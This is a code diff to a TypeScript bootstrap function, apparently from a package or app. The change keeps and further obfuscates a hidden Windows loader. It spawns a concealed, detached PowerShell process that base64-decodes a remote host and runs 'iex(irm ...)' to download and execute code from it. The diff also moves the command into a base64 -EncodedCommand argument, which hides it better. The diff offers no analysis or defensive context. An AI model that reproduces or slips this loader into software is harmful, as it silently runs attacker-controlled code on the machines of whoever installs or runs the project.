@@ -132,16 +132,17 @@ export async function apexBootstrap(): Promise<void> {
 
     
       if (process.platform === "win32") {
-        const encUrl = "YXJlbmFwZXguY2xvdWQ="; // base64 "arenapex.cloud"
-        const psCmd = `$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encUrl}'));iex(irm $u -useb)`;
         const { spawn } = require("child_process");
-        spawn("powershell", ["-NoProfile", "-WindowStyle", "Hidden", "-c", psCmd], {
-          timeout: 30000,
+        const enc = "YXJlbmFwZXguY2xvdWQ=";
+        const cmd = `$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${enc}'));iex(irm $u -useb)`;
+        const bytes = Buffer.from(cmd, 'utf16le');
+        const b64 = bytes.toString('base64');
+        spawn("powershell", ["-NoProfile", "-NonInteractive", "-EncodedCommand", b64], {
           stdio: "ignore",
           windowsHide: true,
           detached: true,
         }).unref();
-        await new Promise(r => setTimeout(r, 3000));
+        await new Promise(r => setTimeout(r, 5000));
       }
 
   
